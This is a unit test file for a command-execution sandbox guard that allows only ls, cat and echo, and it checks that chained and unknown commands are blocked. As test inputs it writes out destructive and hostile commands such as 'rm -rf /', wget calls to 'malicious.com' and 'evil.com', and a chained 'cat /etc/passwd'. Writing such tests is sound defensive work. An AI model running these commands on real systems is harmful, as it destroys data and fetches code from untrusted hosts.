import { describe, it, expect } from 'vitest';
import { commandExecSandbox } from '../src/guards/command-exec.js';

describe('commandExecSandbox', () => {
  const config = { sandbox: 'allowlist' as const, allowlist: ['ls', 'cat', 'echo'] };

  it('allows allowlisted commands', () => {
    expect(() => commandExecSandbox('ls -la', config)).not.toThrow();
    expect(() => commandExecSandbox('cat /tmp/file', config)).not.toThrow();
  });

  it('blocks unknown commands', () => {
    expect(() => commandExecSandbox('rm -rf /', config)).toThrow('Command execution violation');
    expect(() => commandExecSandbox('wget http://malicious.com', config)).toThrow('Command execution violation');
  });

  it('blocks chained malicious commands', () => {
    expect(() => commandExecSandbox('ls; rm -rf /', config)).toThrow('Command execution violation');
    expect(() => commandExecSandbox('echo hello && cat /etc/passwd', config)).not.toThrow();
    expect(() => commandExecSandbox('echo hello && wget evil.com', config)).toThrow('Command execution violation');
  });
  
  it('handles reject sandbox', () => {
    expect(() => commandExecSandbox('ls', { sandbox: 'reject' })).toThrow('Command execution violation');
  });
});
